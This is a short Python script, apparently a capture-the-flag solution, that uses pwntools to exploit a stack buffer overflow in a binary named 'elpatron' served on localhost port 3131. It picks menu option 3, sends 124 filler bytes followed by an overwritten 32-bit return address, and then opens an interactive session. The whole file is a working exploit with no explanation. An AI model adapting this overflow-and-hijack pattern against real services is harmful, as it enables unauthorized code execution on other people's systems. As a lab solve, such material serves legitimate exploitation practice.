from pwn import *

# r = process("./elpatron")
r = remote("127.0.0.1", 3131)

off = 124
addr = p32(0x80499f5)
payload = b"A" * off + addr
print(payload)

log.info("Sending payload...")
r.recvuntil(b"> ")
r.sendline(b"3")

r.recvuntil(b"> ")
r.sendline(payload)
log.info("Payload sent")

r.interactive()